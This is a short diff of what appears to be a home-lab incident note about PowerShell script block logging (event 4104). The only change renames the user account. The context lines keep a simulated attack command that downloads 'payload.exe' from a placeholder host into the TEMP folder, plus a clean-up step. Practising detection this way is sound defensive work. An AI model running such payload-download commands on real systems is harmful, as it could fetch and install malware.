@@ -19,7 +19,7 @@
 • Event ID: 4104
 • Log Source: Apps & Services Logs → Microsoft → Windows → PowerShell → Operational
 • Timestamp: 2025-04-16 15:14:23
-• Username: Becom
+• Username: BecomingCyber
 • Command Executed:
   Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
 • Outcome: Triggered script block logging (PowerShell Operational log)
@@ -31,7 +31,7 @@
 • Dummy file payload.exe created in %TEMP% using New-Item
 • File removed successfully via:
   Remove-Item "$env:TEMP\payload.exe"
-• Affected account: Becom
+• Affected account: BecomingCyber
 • System Time of Action: 2025-04-16 15:20:18
 
 📌 Analyst Notes:
